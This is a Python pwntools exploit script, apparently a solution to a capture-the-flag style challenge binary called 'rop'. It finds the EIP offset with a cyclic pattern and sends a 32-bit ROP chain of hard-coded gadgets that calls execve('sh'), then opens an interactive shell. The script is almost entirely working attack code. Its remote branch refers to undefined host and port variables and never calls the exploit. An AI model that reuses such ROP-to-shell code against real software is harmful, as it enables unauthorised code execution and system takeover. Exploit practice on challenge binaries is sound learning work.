from pwn import *



def fuzz(f):

	return cyclic(f)

def exploit(r):

	f = fuzz(500)
	eip = cyclic_find(0x6261616b)
	log.info("[+] to control eip : " + str(eip))
	#attack
	#execve("sh",NULL,NULL);
	#syscall , parm1, parm2, parm3 , parm4
	#execve(ebx,ecx,edx)
	xoreax = p32(0x080512c0)
	popedx = p32(0x080551ca)
	popecx = p32(0x080e3c2a)
	popebx = p32(0x080481ec)
	popeax = p32(0x080c28c6)
	addeax3 = p32(0x080ac0f0)
	addeax2 = p32(0x080ac0d7)
	sh = p32(0x80c5ec9)
	null = p32(0x80480b8)
	syscall = p32(0x08055970)
	nop = asm('nop')
	attack = nop * eip
	attack += xoreax
	attack += popebx
	attack += sh
	attack += popecx
	attack += null
	attack += popedx
	attack += null
	attack += addeax3
	attack += addeax3
	attack += addeax3
	attack += addeax2
	attack += syscall

	r.sendline(attack)
	r.interactive()

if __name__ == '__main__':

	if(len(sys.argv) > 2):
		r = remote(host,port)
	else:
		file = 'rop'
		binary = os.getcwd() + '/' + file
		r = process(binary)
		print(util.proc.pidof(r))
		pause()
		exploit(r)


